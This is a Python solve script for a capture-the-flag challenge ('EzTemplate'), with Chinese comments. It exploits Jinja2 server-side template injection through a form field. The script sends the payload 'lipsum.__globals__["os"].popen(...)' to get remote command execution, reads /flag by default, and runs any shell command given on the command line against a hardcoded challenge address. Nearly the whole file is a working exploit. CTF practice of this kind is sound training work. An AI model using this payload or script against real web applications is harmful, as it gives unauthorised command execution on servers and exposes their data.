#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTUCTF - 模板里的问候 (EzTemplate) - Jinja2 SSTI 一键复现
用法: python solve_ssti.py [target] [command]
默认: python solve_ssti.py http://103.163.47.230:32856 "cat /flag"
"""
import sys
import re
import html
import urllib.parse
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:32856"
CMD = sys.argv[2] if len(sys.argv) > 2 else "cat /flag"


def render(payload: str, target: str = TARGET) -> str:
    """把 payload 当作 nickname 提交到 /preview，返回渲染结果文本。"""
    data = urllib.parse.urlencode({"nickname": payload}).encode()
    req = urllib.request.Request(target.rstrip("/") + "/preview", data=data)
    body = urllib.request.urlopen(req, timeout=25).read().decode("utf-8", "replace")
    m = re.search(r'<div class="output">(.*?)</div>', body, re.S)
    if not m:
        m2 = re.search(r'<section class="error">(.*?)</section>', body, re.S)
        return "[no output] " + (m2.group(1) if m2 else body[:300])
    # 服务端结果先经 Jinja 自动转义，再被 index.html 自动转义一次 -> 双层反转义
    return html.unescape(html.unescape(m.group(1)))


def ssti_rce(cmd: str, target: str = TARGET) -> str:
    # lipsum 是 Jinja2 全局函数，其 __globals__ 里带 os 模块
    payload = '{{ lipsum.__globals__["os"].popen("%s").read() }}' % cmd
    out = render(payload, target)
    return out.replace("你好，", "", 1).rsplit("！欢迎使用 EzTemplate。", 1)[0]


if __name__ == "__main__":
    print("[*] 探测: {{7*7}} ->", render("{{7*7}}").strip()[:60])
    print("[*] 身份:", ssti_rce("id").strip())
    print("[*] 命令:", CMD)
    print(ssti_rce(CMD))
